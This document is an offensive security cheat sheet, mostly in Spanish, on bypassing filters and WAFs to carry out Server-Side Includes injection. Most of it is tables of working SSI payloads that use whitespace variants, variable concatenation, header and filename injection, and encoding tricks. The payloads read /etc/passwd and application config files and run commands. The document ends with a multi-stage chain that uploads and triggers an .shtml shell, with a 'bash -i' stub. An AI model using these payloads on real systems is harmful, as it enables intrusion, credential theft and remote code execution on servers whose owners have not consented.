---
aliases:
  - SSI Filter Bypass
  - SSI WAF Bypass
  - SSI Encoding
tags:
  - type/technique
  - vuln/ssi
  - technique/defense-evasion
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: SubCheatSheet
linked:
  - '[[Server-Side Includes (SSI) Injection]]'
---
# SSI - Evasión de Filtros

***

## Whitespace Tricks

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Block `<!--#exec` literal | `<!--#  exec cmd="id"-->` | Multi-space después `#`. |
| Block `#exec` | `<!-- #exec cmd="id" -->` | Space después `<!--`. |
| Block sin space | `<!--#exec cmd = "id" -->` | Spaces alrededor del `=`. |
| Block tab vs space | `<!--#exec\tcmd=\"id\"-->` | Tab en lugar de space. |
| Multi-whitespace | `<!--  #  exec  cmd  =  \"id\"  -->` | Multiple spaces. |
| Newlines in directive | `<!--#exec\ncmd="id"\n-->` | Some parsers tolerate. |
| Trailing space | `<!--#exec cmd="id" -->` (extra space) | Standard. |
| `cmd` attribute order | `<!--#exec cmd="id"-->` vs ` -->` (no space) | Edge tolerance. |
| Apache `mod_include` is permissive | Most parsers tolerate variants | Standard. |
| IIS variants | Different whitespace tolerance | Per-server. |
^ssi-bypass-whitespace

___

## `#set` Concatenation

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concept | Block `/etc/passwd` literal → split via `#set` vars | Filter bypass via concat. |
| Split path | `<!--#set var="p1" value="/etc/" --><!--#set var="p2" value="passwd" --><!--#include file="$p1$p2" -->` | Standard. |
| Split keyword | `<!--#set var="a" value="ex" --><!--#set var="b" value="ec" --><!--#exec cmd="$a$b $cmd" -->` | If parser does var subs first. |
| Split filter target | `<!--#set var="x" value="cat /etc/" --><!--#exec cmd="$x" -->` | Concat with command. |
| Combine con env vars | Use existing env vars en path concat | `$DOCUMENT_ROOT/../etc/passwd` |
| Multi-step set chain | Build complex strings through multiple sets | Chain. |
| Var interpolation in include | `<!--#include file="$DOCUMENT_ROOT/../config/db.yml" -->` | Standard. |
| Var interpolation in exec | `<!--#exec cmd="cat $DOCUMENT_ROOT/../etc/passwd" -->` | Combine. |
| WAF inspection only on raw | Concat'd value escapes WAF regex | Standard. |
| Combine con `#if` | Conditional logic con vars | Edge. |
^ssi-bypass-set-concat

___

## Inyección via Filename / Headers

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Filename injection | Upload con filename `<!--#exec cmd="id" -->.txt` | If filename listed en .shtml. |
| Filename with extension trick | `shell.shtml` con SSI content | Direct render. |
| Profile fields | Bio / signature reflected | Stored vector. |
| Comment fields | Persistent SSI inject | Stored. |
| Header User-Agent | If logged en .shtml dashboard | Header reflection. |
| Header Referer | Same | Same. |
| Header Cookie | If reflected | Edge. |
| Header X-Custom | If logged / reflected | Edge. |
| URL path | `/page.shtml/<!--#exec cmd="id"-->` | Path-based. |
| Form fields | Search, contact forms | Most common vector. |
| Email subject if rendered en .shtml | Edge case | Per-app. |
| Dashboard logs | If logs displayed via SSI | High-impact. |
| Combine con file upload | Upload SSI .shtml directly | Standard. |
| Combine con stored XSS | XSS + SSI compound | Multi-vector. |
^ssi-bypass-filename-headers

___

## Encoding y CGI Fallback

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| HTML entity encoding | `&lt;!--#exec cmd="id"--&gt;` | If app decodes pre-parse. |
| URL encoding | `%3C!--%23exec%20cmd=%22id%22--%3E` | Standard. |
| Mixed encoding | Combinations | Multi-layer. |
| CGI fallback (NOEXEC bypass) | `<!--#include virtual="/cgi-bin/test.cgi?$(id)" -->` | If CGI accepts shell command via param. |
| CGI con vulnerable script | Trigger CGI script with payload | Standard. |
| `#config errmsg` for custom output | Customize error to reveal info | Edge. |
| Single quote vs double | `<!--#exec cmd='id'-->` vs `"id"` | Quote bypass. |
| No quotes | `<!--#exec cmd=id -->` (some parsers) | Edge tolerance. |
| Unicode whitespace | Different whitespace chars | Edge. |
| SVG con SSI inside | Upload SVG con SSI directives | Edge. |
| `+IncludesNOEXEC` workflow | Use `#include` for LFI; chain con writable upload + SSI for RCE | Standard. |
| Multi-stage chain | Stage 1: include reveals upload dir → Stage 2: upload SSI → Stage 3: include uploaded | Compound. |
| Combine con LFI | LFI to source disclosure → identify SSI vector | Adjacent. |
| Combine con SSRF | SSRF includes SSI directives via include virtual | Edge. |
^ssi-bypass-encoding-cgi

### Multi-stage filter bypass

```html
<!-- If `#exec` blocked but `#include virtual` works: -->

<!-- Stage 1: Confirm SSI active -->
<!--#echo var="DOCUMENT_ROOT" -->

<!-- Stage 2: Read app source for upload paths -->
<!--#include file="/var/www/html/upload.php" -->

<!-- Stage 3: Upload .shtml con SSI exec -->
<!-- Via separate upload endpoint -->

<!-- Stage 4: Trigger uploaded shell -->
<!--#include virtual="/uploads/atacante.shtml" -->
<!-- atacante.shtml contains: <!--#exec cmd="bash -i ..."--> -->

<!-- Or chain via vulnerable CGI -->
<!--#include virtual="/cgi-bin/old-script.cgi?cmd=$(id)" -->
```

***
